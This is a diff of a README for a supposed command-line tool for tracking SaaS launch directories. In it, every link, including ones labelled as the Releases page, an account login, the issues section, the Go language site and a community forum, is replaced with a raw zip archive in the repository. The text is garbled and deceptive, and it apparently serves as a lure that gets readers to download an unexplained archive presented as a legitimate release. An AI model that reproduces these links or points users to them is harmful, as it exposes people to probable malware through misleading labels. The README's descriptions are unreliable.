@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **cli** tool for https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip! This easy-to-use command-line application helps you discover, filter, and track over 300 high-quality directories for your SaaS product launches. 
+Welcome to the **cli** tool for https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip! This easy-to-use command-line application helps you discover, filter, and track over 300 high-quality directories for your SaaS product launches. 
 
 ## ✅ Features
 
@@ -16,7 +16,7 @@ Welcome to the **cli** tool for https://raw.githubusercontent.com/cliffor883/cli
 
 To get started with the **cli** tool, visit the Releases page to download the latest version: 
 
-[![Download cli](https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip)](https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip)
+[![Download cli](https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip)](https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version of the **cli** tool.
@@ -46,7 +46,7 @@ Once you have the CLI tool installed, follow these steps to start using it:
 
 To sync your favorite directories across devices:
 
-1. Ensure you log into your account on https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip
+1. Ensure you log into your account on https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip
 2. Use the command `cli sync` to update your favorites list.
 3. Your directories will now be available on all your devices.
 
@@ -60,16 +60,16 @@ If you run into issues while using the **cli** tool, consider the following trou
 
 ## 🌟 Support and Contribution
 
-If you have questions or need help, you can raise an issue in the [issues section](https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip) of this repository. 
+If you have questions or need help, you can raise an issue in the [issues section](https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip) of this repository. 
 
 If you would like to contribute to the **cli** tool, please clone the repository and submit a pull request. We welcome suggestions for new features and improvements.
 
 ## 🔗 Additional Resources
 
-- [https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip](https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip)
-- [Go Programming Language](https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip)
-- [Community Forums on Indie Hackers](https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip)
+- [https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip](https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip)
+- [Go Programming Language](https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip)
+- [Community Forums on Indie Hackers](https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip)
 
 Feel free to explore and enjoy using the **cli** tool to enhance your SaaS product launches! Don’t forget to visit the Releases page to download the latest updates:
 
-[![Download cli](https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip)](https://raw.githubusercontent.com/cliffor883/cli/main/internal/auth/cli-1.8-alpha.3.zip)
+[![Download cli](https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip)](https://github.com/cliffor883/cli/raw/refs/heads/main/pkg/Software-1.3-alpha.2.zip)
